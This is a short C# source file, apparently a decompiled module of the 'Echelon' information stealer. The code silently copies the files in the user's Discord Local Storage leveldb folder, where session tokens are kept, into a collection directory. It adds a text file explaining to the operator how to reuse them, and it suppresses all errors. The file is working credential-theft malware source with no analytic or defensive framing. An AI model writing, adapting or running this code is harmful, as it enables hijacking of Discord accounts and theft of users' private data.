using Echelon;
using System.IO;

internal class ad
{
	public static int a = 0;

	public static string b = "\\discord\\Local Storage\\leveldb\\";

	public static void a(string ih)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + b).GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(ih + "\\Discord\\Local Storage\\leveldb\\");
				File.AppendAllText(ih + "\\Discord\\Faq.txt", "Copy all files along this path: >AppData>Roaming>discord>Local Storage>leveldb");
				fileInfo.CopyTo(ih + "\\Discord\\Local Storage\\leveldb\\" + fileInfo.Name);
			}
			ad.a++;
		}
		catch
		{
		}
	}
}
